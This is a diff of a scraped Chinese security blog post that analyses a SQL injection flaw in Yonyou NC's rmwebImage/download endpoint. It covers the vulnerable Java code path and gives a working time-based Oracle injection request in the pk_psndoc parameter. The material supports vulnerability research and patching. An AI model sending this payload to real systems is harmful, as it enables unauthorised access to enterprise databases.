@@ -4,15 +4,6 @@ source: https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk_psndoc-sqli.html
 asset_dir: embedded-base64
 ---
 
-# 用友NC rmwebImage/download sql注入漏洞
-
-[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/5 08:30
-- 882浏览
-- [0评论](#comment)
-- 2小时阅读
-
----
-
 # 漏洞简介
 
 [用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/rmwebImage/download接口中的 pk\_psndoc 参数实现sql注入，从而窃取服务器的敏感信息。
@@ -38,6 +29,14 @@ NC65
 代码安全审计
 
 modules/hrss/lib/pubhrss\_pub/nc/bs/hrss/pub/action/RMWebImageAction.java
+
+深入探索
+
+VPN服务
+
+文件大小转换
+
+云安全解决方案
 
 ```
 package nc.bs.hrss.pub.action;
@@ -143,7 +142,7 @@ extends BaseAction {
 
 pk\_psndoc 参数直接代入 queryAggRMPsndocVO 函数，其实现逻辑如下
 
-漏洞扫描服务
+漏洞预警服务
 
 ```
 private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
@@ -287,7 +286,7 @@ Host: nc65.mrxn.net
 
 漏洞利用示例
 
-漏洞扫描服务
+漏洞预警服务
 
 ```
 GET /portal/pt/rmwebImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)-- HTTP/1.1
@@ -304,29 +303,3 @@ Host: nc65.mrxn.net
 # 参考
 
 - `https://security.yonyou.com/#/noticeInfo?id=676`
-
-- 标签：
-- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
-- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
-- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
-- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
-- [#Java](https://mrxn.net/tag/Java)
-- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
-
----
-
-文章目录
-
-- [1.漏洞简介](#toc-1-)
-- [2.影响版本](#toc-2-)
-- [3.fofa语法](#toc-3-)
-- [4.漏洞分析](#toc-4-)
-- [5.漏洞复现](#toc-5-)
-- [6.参考](#toc-6-)
-
-  
-  
-
-![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAK3klEQVR4Aeybi3LcRg5FdfL//+w1hDpU9yVbHEuyZ7aqXUEu7wNgixhGijb739vb26+v1K8H/zjbuHyF5h7F1ZzSnVHXY6UuF83KxUd1c1/BWsjvvv3XqzyBYyG/PwVvj9Tq4MAbfNQq5z1WPvQMfWgO1+i8EbNXbkYuQs+WizDr9kPr0Gg+0fwdjn3HQkZxXz/vCZwWAr11mHF1ROicn4LMpQ6dfzSX/clzzle4M6HPJs9Z8LmfeTl0H8yoP+JpIaO5r//9E/jrC4H5U5GfPjl0Tn73KB7JmRFz5kqHPot5mLm6uJqj/yf41xfyJ4fZ2be3by/ETwfw/lOWDxVmnrp96nLoPvnKh87BGe2B9pJD69Co7z3F1OVi5tS/g99eyHduvnvPT+C0ELeeeG69Vt77ftW//Ld/xzv19v52AW+P/nHuFTpDD3ifLxfN3SF0vzmYufoKvV/iVf60kKvQ1v7dEzgWAr11+BzzaNB5tw+PcefAnFcXoX15IrQPpLXkwPTGQHMboLlfk3pydei8XITW4XM0X3gspMiu5z+B/9z6n6JHtw/6UyDXXyHMeWh+l0/f+xWmJy+vKjn0PcurgubmVljZKrjOl/fV2m/I6qk/SV8uBHr70Oj5oDk0qvuJgNahUR+am3tUN5cIPQ/OmFk5dFYuQut3Z4PO2WdeVF8hdD80XuWWC7kKb+3vP4H/YN4WzNwjQOt+GkT9RP3EVQ7m+ebu+s39BEKfwVneWy5C5+AxtG81T79wvyH1FF6ojoVAb9strhA659cAzaHRPmgOM9onQvvZpz/g+6W5d7L4mxno2dBoHJqbSzSXmDm5ObmoLsJ8X2gOH3gsxKaNz30Cx0LcKvS2VsfKnNw8dL96IrRvXj956jD3XeXVoLPOEPWTQ+fTh1mH5jCjfSK0732g+cpXLzwWUmTX85/AciFwvVVoPbcvF6Fz0OiXqi+H2U8dZh+a55zqUxOhs9BYmSpoDo3my6uCWYeZV2Ys+6FzejBzc6K5EZcLGUP7+t89gWMh0Nv8bHt1LH3ofGlXZU4POg+N+iK0bl59xaHz8IFmE1ez1KFn2KcuX+FdTl+Evg80Ole/8FiI5sbnPoHTb3th3h40r+1VQfM8Nsw6NK+eqrt8+snh83mVh87U9VjQep2jCppDo1m45tVTZU6EOV+ZsWD27UuEzgHf/48c3vafH30Ct//IcuPeVS6qJ+pDb19uTg7tq0NzaFQ3v+LqhTD3ljbWNOu3IReh++W/I5d/pQ/dZzj95DDnq+92IRXa9e+ewOm3vXe3ht4qNLp1MfvVYc5Dc/PmEvVhzkPzzBe3RyytSi6WVgU9a6VD+9BoDmauLkL7MGPdcyzzhfsNqafwQnX8lLU6E1xv1zzMPjTX/1OE7odGP0nOgVmH5oCR4//nogC8/1cm0Ji6XIQ5p+5ZRHVxpa986PvYV7jfEJ/Wi+DxPQR6W56rtlUlF6Fz5VWp13WVfIVw3W++ZowFnU9f/hmOc+raLPTM0sbSF/XkInS/XITWodF+EVqHxit9vyE+zRfB2+8hec7canLz0J8CaFR/FKH7nC9C685RL1RLhOsemPXsW/G6V5U+9JzSqtRXWJkq/bq29hviU3kRPBbihjwXXG8dZh1mbr+Yc+Uw90FzaLQfmkNj9kPrsEZ7RGeLMPemLheh8/KLuVoTZg7mORU+FlJk1/OfwPFTlkdxi+Kdrg+9bftE/eTq0H1ycyvMnLxw1QPzPWDm9tWMsdTF0atrdeh50FjeWNA6zGj/mN1vyPg0XuD6tBDoLXo2aA7XaM5tw3UOWjcv2ieHOQfXHGa9+qE1aCzts/LecJ2H1qHRWfbJVwjXfdkPnQP2/x7y9mJ/Tm+I54PemtytJurDnFdfoXP0k6uLMM83f4XZY0Y9Mf07Dn0WaHSefYn60HloVB/zy4UY3vhvn8Dxb+pwvbU8Dsy59JOP269rfeg5MGP61TOWvggf/Wo/hd4XPu4BnH6bnPeDzqfuPFEfOg/s7yFvL/Zn/yPr/2UhwFtVnjdfN/3U5TWjylxdV8lF88krW6WeaF9hevLqr5JXtqq0KvXE8qpWes2oSr+0qtRr1lj6lbX2G+JTeRFc/uokzzdudrw2p+amV9y8OXnm1c3pq8uv0IzoDLk96snN6Yvqon3J1UX9nKM/4n5DfFovgsdCcnueL/U77rbNJXeuaE6+wlVOvdDeuh7LM6SfPHPJzSd6L/Xk6o/MOxZi08bnPoHTQnKLj3I/FaJ98vwy9cVH/dW8sf9upllzYs6W69unLv8qOmfE00K+Onz3/cwTOC3EbTlevkJzYn6akq/mqDsn0TmieXnhqkc9e+RizRjLvq+ic0XnJFcvPC2kxF3PewKnhfgJ8UjyRP3Ptl0Z/Y/+/kVaeVUrvbyxnCPqyT9Dsyv0DPrOWvHU7bdPbk5+51futBCHbHzOEzj9+t0tinms1GurY5k3p6eeaE7Ul4s5R/4IrmZ4L9GcPGev/Mybs//ON1+43xCf1ovg6XdZblX0nLW9qpVeXpX5xPLGco6YeXUx/XFWXmd2xZ1tv1xUz3791H+C7zfkJ57iD844voc400+FqO6nIvX0V3ylO8/55tRXPPPmRnTGXXblp558vNd4vcrleeRj735DxqfxAtfH95Dcllte6fr5NWRevspnvznRfnPq8s9wlXWm+NmM0TMvjl5dpy4XK3NVnrNwvyFXT+iJ2mkhtaWq1VZTr2xV6j/N6x5V+axKqxrLjGdI1LdHLppfcXVxlXd+on2i/YWnhRja+JwncPopK4/hdmt7VfJVTl80J68ZVXLRXHlV8pVfmSpzhcXHKq3KGYlmK3NV+vZdZa60zDvHbHLzhfsN8Sm9CB4/ZXme3J66qL/CzNXWq8zr/ylmf82sUi9czSxvLHPVXyVPLK/qT/XxXnVdM6qcU9djVcbab4hP6UXw+B7ixvJcbk5fNCcXU5eL5pybur6oL6pnf/l6YmlVcvGqt3JZj+ayz/uIOSe5ucL9huTTfDI/LaS2NJbnc6uiGbk58VE9c8mdl+j9R8xePXv1U9dfYfbJzTtPXUxfnmi+8LSQDG/+b5/A6acsb1/bqpKL+WlInrlHeebq3lWpy6/Qs+hV/1jqd/gxp5NyZ7V6/rs58ZyYlat5+w2Zn9HT2fFTltsSVye78+27y6WfPOekL79Ce8VHP7HmnSkXnSOqi/Yl6ov2i+qF+w2pp/BCdXwPcVuP4upr8NPhnFVO3ZyYunyF9hVmprQq9bqu8ozqySszlrnE7NO3V75C+80X7jdk9bSepB8LcVt3mOc0X9sdSz3zcrPmEs3d4diX2dEbr7135pOPPVfXmZeblSemLy88FpJNmz/nCZwW4qcncXU8c7XdsTKvpy63X32FmZNfYc7IjL5nkIvqq75HdXM5V55+6aeFlLjreU/gxxZyte36svy01XWVOVFfLla2KnlpVfbV9V2ZTXS2qC/PuSs9c85JtF/Ulxf+2ELyUJt/7Ql8eyFuWawtj5XHMieavcuZ/yynt8p6LzFz6qs55sXMpe48MfPyEb+9kHHYvv7+EzgtxC0nPnor++7yfmoyL9dPvJtb/l2P96jsWOqinnw1V9283D51ub6oX3haSIm7nvcEjoW4rTu8O6r9fhrMq8vTX/GVnvNqrlmxtLFW+pip65wtt1+s7FiZ0zOfvrq5wmMhRXY9/wnshTx/B9MJ/gcAAP//R5uAGgAAAAZJREFUAwAA3jeVIRe0qwAAAABJRU5ErkJggg==)
-
-手机扫码阅读
